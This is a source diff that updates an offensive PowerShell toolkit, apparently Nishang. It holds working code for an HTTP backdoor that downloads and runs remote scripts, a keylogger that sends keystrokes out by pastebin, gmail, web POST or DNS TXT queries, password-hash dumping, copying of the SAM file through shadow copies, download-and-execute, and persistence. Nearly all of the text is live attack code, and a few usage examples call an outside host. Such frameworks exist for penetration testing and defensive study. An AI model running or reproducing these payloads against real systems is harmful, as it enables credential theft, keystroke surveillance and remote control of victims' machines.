     while($true)
     {
-    start-sleep -seconds 5 
-    $webclient = New-Object System.Net.WebClient
-    $filecontent = $webclient.DownloadString("$CheckURL")
-    $systime = Get-Date -UFormat %R
-    if ($systime -match $time)
-    {
-        $pastevalue = Invoke-Expression $webclient.DownloadString($URL)
-        $pastevalue
-        $exec++
-        if ($exfil -eq $True)
+        $exec = 0
+        start-sleep -seconds 5 
+        $webclient = New-Object System.Net.WebClient
+        $filecontent = $webclient.DownloadString("$CheckURL")
+        $systime = Get-Date -UFormat %R
+        if ($systime -match $time)
         {
-            $pastename = $env:COMPUTERNAME + "Results of Time Execution: "
-            Do-Exfiltration "$pastename" "$pastevalue" "$username" "$password" "$dev_key" "$keyoutoption"
+            $pastevalue = Invoke-Expression $webclient.DownloadString($URL)
+            $pastevalue
+            $exec++
+            if ($exec -eq 1)
+            {
+                Start-Sleep -Seconds 60
+            }
         }
-        if ($exec -eq 1)
+        elseif ($filecontent -eq $StopString)
         {
-            Start-Sleep -Seconds 60
+            break
         }
-    }
-    elseif ($filecontent -eq $StopString)
-    {
-        break
-    }
     }
 }
 
@@ -1942,8 +1877,8 @@ Execute-Command-MSSQL -ComputerName sqlserv01 -UserName sa -Password sa1234
 Execute-Command-MSSQL -ComputerName 192.168.1.10 -UserName sa -Password sa1234
 
 .LINK
-http://labofapenetrationtester.blogspot.com/
-http://code.google.com/p/nishang
+http://labofapenetrationtester.com/
+https://github.com/samratashok/nishang
 
 .NOTES
 Based mostly on the Get-TSSqlSysLogin by Niklas Goude and accompanying blog post at 
@@ -1952,11 +1887,19 @@ http://www.truesec.com
 
 #>
 
-Param(
-    [Parameter(Mandatory = $true, Position = 0, ValueFromPipeLine= $true)]
-    [Alias("PSComputerName","CN","MachineName","IP","IPAddress")][string]$ComputerName,
-    [parameter(Mandatory = $true, Position = 1)][string]$UserName,
-    [parameter(Mandatory = $true, Position = 2)][string]$Password
+    [CmdletBinding()] Param(
+        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeLine= $true)]
+        [Alias("PSComputerName","CN","MachineName","IP","IPAddress")]
+        [string]
+        $ComputerName,
+
+        [parameter(Mandatory = $true, Position = 1)]
+        [string]
+        $UserName,
+    
+        [parameter(Mandatory = $true, Position = 2)]
+        [string]
+        $Password
     )
 Try{
     function Make-Connection ($query){
@@ -2036,7 +1979,7 @@ Payload which queries a URL for instructions and then downloads and executes a p
 .DESCRIPTION
 This payload queries the given URL and after a suitable command (given by MagicString variable) is found, 
 it downloads and executes a powershell script. The payload could be stopped remotely if the string at CheckURL matches
-the string given in StopString variable. By using the exfile parameter, it would be possible to 
+the string given in StopString variable.
 
 .PARAMETER CheckURL
 The URL which the payload would query for instructions.
@@ -2050,31 +1993,6 @@ The string which would act as an instruction to the payload to proceed with down
 .PARAMETER StopString
 The string which if found at CheckURL will stop the payload.
 
-PARAMETER exfil
-Use this parameter to use exfiltration methods for returning the results.
-
-.PARAMETER dev_key
-The Unique API key provided by pastebin when you register a free account.
-Unused for tinypaste.
-Unused for gmail option.
-
-.PARAMETER username
-Username for the pastebin account where data would be pasted.
-Username for the tinypaste account where data would be pasted.
-Username for the gmail account where attachment would be sent as an attachment.
-
-.PARAMETER password
-Password for the pastebin account where data would be pasted.
-Password for the tinypaste account where data would be pasted.
-Password for the gmail account where data would be sent.
-
-.PARAMETER keyoutoption
-The method you want to use for exfitration of data.
-"0" for displaying on console
-"1" for pastebin.
-"2" for gmail
-"3" for tinypaste   
-
 .Example
 
 PS > HTTP-Backdoor
@@ -2087,77 +2005,57 @@ PS > HTTP-Backdoor http://pastebin.com/raw.php?i=jqP2vJ3x http://pastebin.com/ra
 Use above when using the payload from non-interactive shells.
 
 .EXAMPLE
-PS > HTTP-Backdoor http://pastebin.com/raw.php?i=jqP2vJ3x http://pastebin.com/raw.php?i=Zhyf8rwh start123 stopthis -exfil <devkey> <username> <password> <keyoutoption>
+PS > HTTP-Backdoor http://pastebin.com/raw.php?i=jqP2vJ3x http://pastebin.com/raw.php?i=Zhyf8rwh start123 stopthis | Do-Exfiltration -ExfilOption DNS -DomainName example.com -AuthNS 192.168.254.228
 
-Use above command for using exfiltration methods.
+Use above command for data exfiltration to a DNS server which logs TXT queries.
+
 
 .LINK
-http://labofapenetrationtester.blogspot.com/
-http://code.google.com/p/nishang
+http://labofapenetrationtester.com/
+https://github.com/samratashok/nishang
 #>
 
 
-    [CmdletBinding(DefaultParameterSetName="noexfil")]
-    Param( [Parameter(Parametersetname="exfil")] [Switch] $exfil,
-    [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")] [String]$CheckURL,
-    [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")] [String]$PayloadURL,
-    [Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 2, Mandatory = $True, Parametersetname="noexfil")] [String]$MagicString,
-    [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 3, Mandatory = $True, Parametersetname="noexfil")] [String]$StopString,
-    [Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")] [String]$dev_key,
-    [Parameter(Position = 5, Mandatory = $True, Parametersetname="exfil")] [String]$username,
-    [Parameter(Position = 6, Mandatory = $True, Parametersetname="exfil")] [String]$password,
-    [Parameter(Position = 7, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
+    [CmdletBinding()] Param(
 
-    $modulepath = Split-Path $script:MyInvocation.MyCommand.Path
-    $modulename = $script:MyInvocation.MyCommand.Name
-    $name = "$modulepath\$modulename"
-    
-    if ($exfil -eq $True)
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $CheckURL,
+
+        [Parameter(Position = 1, Mandatory = $True)]
+        [String]
+        $PayloadURL,
+
+        [Parameter(Position = 2, Mandatory = $True)]
+        [String]
+        $MagicString,
+
+        [Parameter(Position = 3, Mandatory = $True)]
+        [String]
+        $StopString
+    )
+
+   while($true)
     {
-        $Argumentlist = StringtoBase64 -IsString "Import-Module $name;Logic-HTTP-Backdoor $CheckURL $PayloadURL $MagicString $StopString $dev_key $username $password $keyoutoption $exfil"
-        Start-Process -WindowStyle Hidden powershell.exe -ArgumentList "-encodedcommand $Argumentlist"
-    }
-    else
-    {
-        $Argumentlist = StringtoBase64 -IsString "Import-Module $name;Logic-HTTP-Backdoor $CheckURL $PayloadURL $MagicString $StopString"
-        Start-Process -WindowStyle Hidden powershell.exe -ArgumentList "-encodedcommand $Argumentlist"
-    }
-}
-
-
-
-##################################################Logic for the HTTP-Backdoor.#######################################################
-function Logic-HTTP-Backdoor($CheckURL, $PayloadURL, $MagicString, $StopString, $dev_key, $username, $password, $keyoutoption, $exfil)
-{
-
-
-    while($true)
-    {
-    $exec = 0
-    start-sleep -seconds 5
-    $webclient = New-Object System.Net.WebClient
-    $filecontent = $webclient.DownloadString("$CheckURL")
-    if($filecontent -eq $MagicString)
-    {
-        $pastevalue = Invoke-Expression $webclient.DownloadString($PayloadURL)
-        $pastevalue
-        $exec++
-        if ($exfil -eq $True)
+        $exec = 0
+        start-sleep -seconds 5
+        $webclient = New-Object System.Net.WebClient
+        $filecontent = $webclient.DownloadString("$CheckURL")
+        if($filecontent -eq $MagicString)
         {
-            $pastename = $env:COMPUTERNAME + " Results of HTTP Backdoor: "
-            Do-Exfiltration "$pastename" "$pastevalue" "$username" "$password" "$dev_key" "$keyoutoption"
+            $pastevalue = Invoke-Expression $webclient.DownloadString($PayloadURL)
+            $pastevalue
+            $exec++
+            if ($exec -eq 1)
+            {
+                Start-Sleep -Seconds 60
+            }
         }
-        if ($exec -eq 1)
+        elseif ($filecontent -eq $StopString)
         {
-            Start-Sleep -Seconds 60
+            break
         }
     }
-    elseif ($filecontent -eq $StopString)
-    {
-        break
-    }
-    }
-  
     
 }
 
@@ -2171,36 +2069,13 @@ Payload which logs keys.
 
 .DESCRIPTION
 This payload logs a user's keys and writes them to file key.log (I know its bad :|) in user's temp directory.
-The keys can then be exfiltrated to pastebin|tinypaste|gmail|all as per selection. Saved keys could then be decoded
-using the Parse_Key script.
+Saved keys could then be decoded using the Parse_Key script.
 
 .PARAMETER CheckURL
 The URL which would contain the MagicString used to stop keylogging.
 
 .PARAMETER MagicString
 The string which when found at CheckURL will stop the keylogger.
-
-.PARAMETER dev_key
-The Unique API key provided by pastebin when you register a free account.
-Unused for tinypaste.
-Unused for gmail option.
-
-.PARAMETER username
-Username for the pastebin account where data would be pasted.
-Username for the tinypaste account where data would be pasted.
-Username for the gmail account where attachment would be sent as an attachment.
-
-.PARAMETER password
-Password for the pastebin account where data would be pasted.
-Password for the tinypaste account where data would be pasted.
-Password for the gmail account where data would be sent.
-
-.PARAMETER keyoutoption
-The method you want to use for exfitration of data.
-"0" for displaying on console
-"1" for pastebin.
-"2" for gmail
-"3" for tinypaste   
 
 .EXAMPLE
 PS > Keylogger
@@ -2216,48 +2091,77 @@ Use above when using the payload from non-interactive shells. This will exfiltra
 
 
 .LINK
-http://labofapenetrationtester.blogspot.com/
-http://code.google.com/p/nishang
+http://labofapenetrationtester.com/
+https://github.com/samratashok/nishang
 #>
-
-
-    [CmdletBinding(DefaultParameterSetName="noexfil")]
-    Param( [Parameter(Parametersetname="exfil")] [Switch] $exfil,
-    [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")] [String]$CheckURL,
-    [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")] [String]$StopString,
-    [Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [String]$dev_key,
-    [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [String]$username,
-    [Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")] [String]$password,
-    [Parameter(Position = 5, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
-
-    $modulepath = Split-Path $script:MyInvocation.MyCommand.Path
-    $modulename = $script:MyInvocation.MyCommand.Name
-    $name = "$modulepath\$modulename"
     
-    if ($exfil -eq $True)
-    {
-        $Argumentlist = StringtoBase64 -IsString "Import-Module $name;Logic-Keylog $CheckURL $StopString"
-        Start-Process -WindowStyle Hidden powershell.exe -ArgumentList "-encodedcommand $Argumentlist"
-        $Argumentlist_Keypaste = StringtoBase64 -IsString "Import-Module $name;Logic-Keypaste $CheckURL $StopString $dev_key $username $password $keyoutoption $exfil"
-        Start-Process -WindowStyle Hidden powershell.exe -ArgumentList "-encodedcommand $Argumentlist_Keypaste"
-    }
-    else
-    {
-        $Argumentlist = StringtoBase64 -IsString "Import-Module $name;Logic-Keylog $CheckURL $StopString"
-        Start-Process -WindowStyle Hidden powershell.exe -ArgumentList "-encodedcommand $Argumentlist"
-        $Argumentlist_Keypaste = StringtoBase64 -IsString "Import-Module $name;Logic-Keypaste $CheckURL $StopString"
-        Start-Process -WindowStyle Hidden powershell.exe -ArgumentList "-encodedcommand $Argumentlist_Keypaste"
-    }
-}
+    [CmdletBinding(DefaultParameterSetName="noexfil")] Param( 
+        [Parameter(Parametersetname="exfil")]
+        [Switch]
+        $persist,
 
+        [Parameter(Parametersetname="exfil")]
+        [Switch]
+        $exfil,
 
-function Logic-Keylog ($CheckURL, $StopString)
+        [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")]
+        [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")]
+        [String]
+        $CheckURL,
+
+        [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")]
+        [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")]
+        [String]
+        $MagicString,
+
+        [Parameter(Position = 2, Mandatory = $False, Parametersetname="exfil")] [ValidateSet("gmail","pastebin","WebServer","DNS")]
+        [String]
+        $ExfilOption,
+
+        [Parameter(Position = 3, Mandatory = $False, Parametersetname="exfil")] 
+        [String]
+        $dev_key = "null",
+
+        [Parameter(Position = 4, Mandatory = $False, Parametersetname="exfil")]
+        [String]
+        $username = "null",
+
+        [Parameter(Position = 5, Mandatory = $False, Parametersetname="exfil")]
+        [String]
+        $password = "null",
+
+        [Parameter(Position = 6, Mandatory = $False, Parametersetname="exfil")]
+        [String]
+        $URL = "null",
+      
+        [Parameter(Position = 7, Mandatory = $False, Parametersetname="exfil")]
+        [String]
+        $DomainName = "null",
+
+        [Parameter(Position = 8, Mandatory = $False, Parametersetname="exfil")]
+        [String]
+        $AuthNS = "null"   
+   
+    )
+
+$functions =  {
+
+function Keylog
 {
+    Param ( 
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $MagicString,
+
+        [Parameter(Position = 1, Mandatory = $True)]
+        [String]
+        $CheckURL
+    )
     
-    $signature = @' 
+    $signature = @" 
     [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
     public static extern short GetAsyncKeyState(int virtualKeyCode); 
-'@ 
+"@ 
     $getKeyState = Add-Type -memberDefinition $signature -name "Newtype" -namespace newnamespace -passThru 
     $check = 0
     while ($true) 
@@ -2325,99 +2229,170 @@ function Logic-Keylog ($CheckURL, $StopString)
             }
         }
         $check++
-        if ($check -eq 1000)
+        if ($check -eq 6000)
         {
             $webclient = New-Object System.Net.WebClient
             $filecontent = $webclient.DownloadString("$CheckURL")
-            if ($filecontent -eq $StopString)
+            if ($filecontent -eq $MagicString)
             {
                 break
+            }
+            $check = 0
+        }
+    }
+}
+
+
+    function Keypaste
+    {
+        Param ( 
+            [Parameter(Position = 0, Mandatory = $True)]
+            [String]
+            $ExfilOption,
+        
+            [Parameter(Position = 1, Mandatory = $True)]
+            [String]
+            $dev_key,
+        
+            [Parameter(Position = 2, Mandatory = $True)]
+            [String]
+            $username,
+
+            [Parameter(Position = 3, Mandatory = $True)]
+            [String]
+            $password,
+        
+            [Parameter(Position = 4, Mandatory = $True)]
+            [String]
+            $URL,
+
+            [Parameter(Position = 5, Mandatory = $True)]
+            [String]
+            $AuthNS,
+
+            [Parameter(Position = 6, Mandatory = $True)]
+            [String]
+            $MagicString,
+        
+            [Parameter(Position = 7, Mandatory = $True)]
+            [String]
+            $CheckURL
+        )
+
+        $check = 0
+        while($true) 
+        { 
+            $read = 0
+            Start-Sleep -Seconds 5 
+            $pastevalue=Get-Content $env:temp\key.log 
+            $read++
+            if ($read -eq 30)
+            {
+                Out-File -FilePath $env:temp\key.log -Force -InputObject " " 
+                $read = 0
+            }
+            $now = Get-Date; 
+            $name = $env:COMPUTERNAME 
+            $paste_name = $name + " : " + $now.ToUniversalTime().ToString("dd/MM/yyyy HH:mm:ss:fff")
+            function post_http($url,$parameters) 
+            { 
+                $http_request = New-Object -ComObject Msxml2.XMLHTTP 
+                $http_request.open("POST", $url, $false) 
+                $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
+                $http_request.setRequestHeader("Content-length", $parameters.length); 
+                $http_request.setRequestHeader("Connection", "close") 
+                $http_request.send($parameters) 
+                $script:session_key=$http_request.responseText 
+            } 
+
+            function Compress-Encode
+            {
+                #Compression logic from http://blog.karstein-consulting.com/2010/10/19/how-to-embedd-compressed-scripts-in-other-powershell-scripts/
+                $encdata = [string]::Join("`n", $pastevalue)
+                $ms = New-Object System.IO.MemoryStream
+                $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
+                $sw = New-Object System.IO.StreamWriter($cs)
+                $sw.Write($encdata)
+                $sw.Close();
+                $Compressed = [Convert]::ToBase64String($ms.ToArray())
+                $Compressed
+            }
+
+            if ($exfiloption -eq "pastebin")
+            {
+                $utfbytes  = [System.Text.Encoding]::UTF8.GetBytes($Data)
+                $pastevalue = [System.Convert]::ToBase64String($utfbytes)
+                post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
+                post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$pastename&api_paste_code=$pastevalue&api_paste_private=2" 
+            }
+        
+            elseif ($exfiloption -eq "gmail")
+            {
+                #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
+                $smtpserver = “smtp.gmail.com”
+                $msg = new-object Net.Mail.MailMessage
+                $smtp = new-object Net.Mail.SmtpClient($smtpServer )
+                $smtp.EnableSsl = $True
+                $smtp.Credentials = New-Object System.Net.NetworkCredential(“$username”, “$password”); 
+                $msg.From = “$username@gmail.com”
+                $msg.To.Add(”$username@gmail.com”)
+                $msg.Subject = $pastename
+                $msg.Body = $pastevalue
+                if ($filename)
+                {
+                    $att = new-object Net.Mail.Attachment($filename)
+                    $msg.Attachments.Add($att)
+                }
+                $smtp.Send($msg)
+            }
+
+            elseif ($exfiloption -eq "webserver")
+            {
+                $Data = Compress-Encode
+                post_http $URL $Data
+            }
+            elseif ($ExfilOption -eq "DNS")
+            {
+                $code = Compress-Encode
+                $lengthofsubstr = 0
+                $queries = [int]($code.Length/63)
+                while ($queries -ne 0)
+                {
+                    $querystring = $code.Substring($lengthofsubstr,63)
+                    Invoke-Expression "nslookup -querytype=txt $querystring.$DomaName $AuthNS"
+                    $lengthofsubstr += 63
+                    $queries -= 1
+                }
+                $mod = $code.Length%63
+                $query = $code.Substring($code.Length - $mod, $mod)
+                Invoke-Expression "nslookup -querytype=txt $query.$DomainName $AuthNS"
+
+            }
+
+            $check++
+            if ($check -eq 6000)
+            {
+                $check = 0
+                $webclient = New-Object System.Net.WebClient
+                $filecontent = $webclient.DownloadString("$CheckURL")
+                if ($filecontent -eq $MagicString)
+                {
+                    break
+                }
             }
         }
     }
 }
 
-function Logic-Keypaste($CheckURL, $StopString, $dev_key, $username, $password, $keyoutoption, $exfil)
-{
-    
-    $check = 0
-    while($true) 
-    { 
-        $read = 0
-        Start-Sleep -Seconds 5 
-        $pastevalue=Get-Content $env:temp\key.log 
-        $read++
-        if ($read -eq 30)
+        if ($exfil -eq $True)
         {
-            Out-File -FilePath $env:temp\key.log -Force -InputObject " " 
-            $read = 0
+            start-job -InitializationScript $functions -scriptblock {Keypaste $args[0] $args[1] $args[2] $args[3] $args[4] $args[5] $args[6] $args[7]} -ArgumentList @($ExfilOption,$dev_key,$username,$password,$URL,$AuthNS,$MagicString,$CheckURL)
+            start-job -InitializationScript $functions -scriptblock {Keylog $args[0] $args[1]} -ArgumentList @($MagicString,$CheckURL)
         }
-        $now = Get-Date; 
-        $name = $env:COMPUTERNAME 
-        $paste_name = $name + " : " + $now.ToUniversalTime().ToString("dd/MM/yyyy HH:mm:ss:fff")
-        function Post_http($url,$parameters) 
-        { 
-            $http_request = New-Object -ComObject Msxml2.XMLHTTP 
-            $http_request.open("POST", $url, $false) 
-            $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
-            $http_request.setRequestHeader("Content-length", $parameters.length); 
-            $http_request.setRequestHeader("Connection", "close") 
-            $http_request.send($parameters) 
-            $script:session_key=$http_request.responseText 
-            
-        } 
-
-        function Get-MD5()
+        else
         {
-            #http://stackoverflow.com/questions/10521061/how-to-get-a-md5-checksum-in-powershell
-            $md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
-            $utf8 = new-object -TypeName System.Text.UTF8Encoding
-            $hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($password))).Replace("-", "").ToLower()
-            return $hash
+            start-job -InitializationScript $functions -scriptblock {Keylog $args[0] $args[1]} -ArgumentList @($MagicString,$CheckURL)
         }
-
-        if ($keyoutoption -eq "1")
-        {
-            Post_http "http://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
-            Post_http "http://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$paste_name&api_paste_code=$pastevalue&api_paste_private=2" 
-        }
-        
-        elseif ($keyoutoption -eq "2")
-        {
-            #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
-            $filename = "$env:TEMP\key.log"
-            $smtpserver = “smtp.gmail.com”
-            $msg = new-object Net.Mail.MailMessage
-            $att = new-object Net.Mail.Attachment($filename)
-            $smtp = new-object Net.Mail.SmtpClient($smtpServer )
-            $smtp.EnableSsl = $True
-            $smtp.Credentials = New-Object System.Net.NetworkCredential(“$username”, “$password”); 
-            $msg.From = “$username@gmail.com”
-            $msg.To.Add(”$username@gmail.com”)
-            $msg.Subject = $paste_name
-            $msg.Body = “New keys have arrived. Check the attachment.”
-            $msg.Attachments.Add($att)
-            $smtp.Send($msg)
-        }
-
-        elseif ($keyoutoption -eq "3")
-        {
-            
-            $hash = Get-MD5
-            Post_http "http://tny.cz/api/create.xml" "paste=$pastevalue&title=$paste_name&is_code=0&is_private=1&password=$dev_key&authenticate=$username`:$hash"
-        }
-
-        $check++
-        if ($check -eq 1000)
-        {
-            $webclient = New-Object System.Net.WebClient
-            $filecontent = $webclient.DownloadString("$CheckURL")
-            if ($filecontent -eq $StopString)
-            {
-                break
-            }
-        }
-    }
 }
 
 
@@ -2426,12 +2401,8 @@ function Logic-Keypaste($CheckURL, $StopString, $dev_key, $username, $password, 
 ###powerdump.rb from msf
 function Get-PassHashes
 {
-[CmdletBinding(DefaultParameterSetName="noexfil")]
-Param ( [Parameter(Parametersetname="exfil")] [Switch] $exfil,
-[Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")] [String] $dev_key,
-[Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [String]$username,
-[Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [String]$password,
-[Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
+    [CmdletBinding()]
+    Param ()
 function LoadApi
 {
     $oldErrorAction = $global:ErrorActionPreference;
@@ -2775,13 +2746,7 @@ function DumpHashes
             [BitConverter]::ToString($hashes[1]).Replace("-","").ToLower());
     }
 }
-$pastevalue = DumpHashes
-$pastevalue
-    if ($exfil -eq $True)
-        {
-            $pastename = $env:COMPUTERNAME + "Password hashes: "
-            Do-Exfiltration "$pastename" "$pastevalue" "$username" "$password" "$dev_key" "$keyoutoption"
-        }
+DumpHashes
 }
 
 
@@ -2793,7 +2758,7 @@ function Download-Execute-PS
 
 <#
 .SYNOPSIS
-Payload which downloads and executes a powershell script.
+Nishang Payload which downloads and executes a powershell script.
 
 .DESCRIPTION
 This payload downloads a powershell script from specified URL and then executes it on the target.
@@ -2804,14 +2769,38 @@ The URL from where the powershell script would be downloaded.
 .EXAMPLE
 PS > Download-Execute-PS http://pastebin.com/raw.php?i=jqP2vJ3x
 
+.EXAMPLE
+PS > Download-Execute-PS http://script.alteredsecurity.com/evilscript -nodownload
+The above command does not dowload the script file to disk.
+
 .LINK
 http://labofapenetrationtester.blogspot.com/
-http://code.google.com/p/nishang
+https://github.com/samratashok/nishang
 #>
 
-    Param( [Parameter(Position = 0, Mandatory = $True)] [String] $ScriptURL)
-    Invoke-Expression ((New-Object Net.WebClient).DownloadString("$ScriptURL"));
-    $pastevalue
+    [CmdletBinding()] Param(
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $ScriptURL,
+
+        [Parameter(Position = 1)]
+        [Switch]
+        $nodownload
+    )
+
+    if ($nodownload -eq $true)
+    {
+        Invoke-Expression ((New-Object Net.WebClient).DownloadString("$ScriptURL"));
+    }
+    
+    else
+    {
+        $webclient = New-Object System.Net.WebClient
+        $file1 = "$env:temp\deps.ps1"
+        $webclient.DownloadFile($ScriptURL,"$file1")
+        $script:pastevalue = powershell.exe -ExecutionPolicy Bypass -noLogo -command $file1
+        $pastevalue
+    }
 }
 
 #####################################Check credentials on remote computers and create sessions#########################################################
@@ -2853,15 +2842,27 @@ PS > Create-MultipleSessions -filename .\servers.txt -CreateSessions
 Above command uses the credentials available with current powershell session, checks it against multiple computers specified in servers.txt and creates PSSession for those.
 
 .LINK
-http://labofapenetrationtester.blogspot.com/2013/04/poshing-the-hashes.html
-http://code.google.com/p/nishang
+http://labofapenetrationtester.com/2013/04/poshing-the-hashes.html
+https://github.com/samratashok/nishang
 #>
 
-    Param ( [Parameter(Position = 0, Mandatory = $True)] [String] $filename,
-    [Switch] $Creds,
-    [Switch] $CreateSessions,
-    [Switch] $VerboseErrors)
+    [CmdletBinding()] Param ( 
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $filename,
 
+        [Parameter(Mandatory = $False)]
+        [Switch]
+        $Creds,
+    
+        [Parameter(Mandatory = $False)]
+        [Switch]
+        $CreateSessions,
+
+        [Parameter(Mandatory = $False)]
+        [Switch]
+        $VerboseErrors
+    )
     $ErrorActionPreference = "SilentlyContinue"
     if ($VerboseErrors)
     {
@@ -2907,8 +2908,7 @@ http://code.google.com/p/nishang
     }
 }
 
-function Copy-VSS
-{
+##########################################Copy SAM file using Volume Shadow Service################################
 <#
 .SYNOPSIS
 Nishang Payload which copies the SAM file.
@@ -2925,19 +2925,25 @@ PS > Copy-VSS
 Saves the SAM file in current run location of the payload.
 
 .Example
-PS > Copy-VSS -path C:\temp\SAM
+PS > Copy-VSS -path C:\temp
 
 .LINK
 http://www.canhazcode.com/index.php?a=4
-http://code.google.com/p/nishang
+https://github.com/samratashok/nishang
 
 .NOTES
 Code by @al14s
 
 #>
 
-    Param( [Parameter(Position = 0, Mandatory = $True)] [String] $Path)
-    
+
+function Copy-VSS
+{
+    [CmdletBinding()] Param(
+        [Parameter(Position = 0, Mandatory = $False)]
+        [String]
+        $Path
+    )
     $service = (Get-Service -name VSS)
     if($service.Status -ne "Running")
     {
@@ -2946,7 +2952,13 @@ Code by @al14s
     }
     $id = (gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
     $volume = (gwmi win32_shadowcopy -filter "ID='$id'")
-    `cmd /c copy "$($volume.DeviceObject)\windows\system32\config\SAM" $path\SAM` 
+    $filepath = "$pwd\SAM"
+    if ($path)
+    {
+        $filepath = "$path\SAM"
+    }
+
+    `cmd /c copy "$($volume.DeviceObject)\windows\system32\config\SAM" $filepath` 
     $volume.Delete()
     if($notrunning -eq 1)
     {
@@ -2974,7 +2986,13 @@ Persistence created using this function could be cleaned by using the Remove-Per
 The URL which the payload would query for instructions.
 
 .PARAMETER PayloadURL
-The URL from where the powershell script would be downloaded.
+The URL from where commands could be sent. Function names of Powerpreter could be used here.
+If the target has powershell v2 (or you are not sure), use Import-Module Update in the command.
+For example:   Import-Module Update; Get-Wlan-Keys
+
+
+.PARAMETER PowerpreterURL
+The URL from where powerpreter would be downloaded if it is removed from the user's temp directory.
 
 .PARAMETER MagicString
 The string which would act as an instruction to the payload to proceed with download and execute.
@@ -2988,56 +3006,109 @@ Use this parameter to achieve reboot persistence. Different methods of persisten
 .PARAMETER exfil
 Use this parameter to use exfiltration methods for returning the results.
 
+.PARAMETER ExfilOption
+The method you want to use for exfitration of data. Valid options are "gmail","pastebin","WebServer" and "DNS".
+
 .PARAMETER dev_key
 The Unique API key provided by pastebin when you register a free account.
-Unused for tinypaste.
-Unused for gmail option.
+Unused for other options
 
 .PARAMETER username
-Username for the pastebin account where data would be pasted.
-Username for the tinypaste account where data would be pasted.
-Username for the gmail account where attachment would be sent as an attachment.
+Username for the pastebin/gmail account where data would be exfiltrated.
+Unused for other options
 
 .PARAMETER password
-Password for the pastebin account where data would be pasted.
-Password for the tinypaste account where data would be pasted.
-Password for the gmail account where data would be sent.
+Password for the pastebin/gmail account where data would be exfiltrated.
+Unused for other options
 
-.PARAMETER keyoutoption
-The method you want to use for exfitration of data.
-"0" for displaying on console
-"1" for pastebin.
-"2" for gmail
-"3" for tinypaste   
+.PARAMETER URL
+The URL of the webserver where POST requests would be sent.
+
+.PARAMETER DomainName
+The DomainName, whose subdomains would be used for sending TXT queries to.
+
+.PARAMETER AuthNS
+Authoritative Name Server for the domain specified in DomainName
 
 .Example
 PS > Persistence
 The payload will ask for all required options.
 
 .Example
-PS > Persistence -exfil
+PS > Persistence http://pastebin.com/raw.php?i=jqP2vJ3x http://pastebin.com/raw.php?i=Zhyf8rwh start stopthis -exfil -ExfilOption DNS -DomainName example.com -AuthNS 8.8.8.8
 Use above command for using exfiltration methods.
 
 
 .LINK
-http://labofapenetrationtester.blogspot.com/
-http://code.google.com/p/nishang
+http://labofapenetrationtester.com/
+https://github.com/samratashok/nishang
 http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/20/use-powershell-to-create-a-permanent-wmi-event-to-launch-a-vbscript.aspx
 #>
 
     
-    [CmdletBinding(DefaultParameterSetName="noexfil")]
-    Param([Parameter(Parametersetname="exfil")] [Switch] $exfil,
-    [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")] [String]$CheckURL,
-    [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")] [String]$PayloadURL,
-    [Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 2, Mandatory = $True, Parametersetname="noexfil")] [String]$MagicString,
-    [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 3, Mandatory = $True, Parametersetname="noexfil")] [String]$StopString,
-    [Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")] [String]$dev_key,
-    [Parameter(Position = 5, Mandatory = $True, Parametersetname="exfil")] [String]$username,
-    [Parameter(Position = 6, Mandatory = $True, Parametersetname="exfil")] [String]$password,
-    [Parameter(Position = 7, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
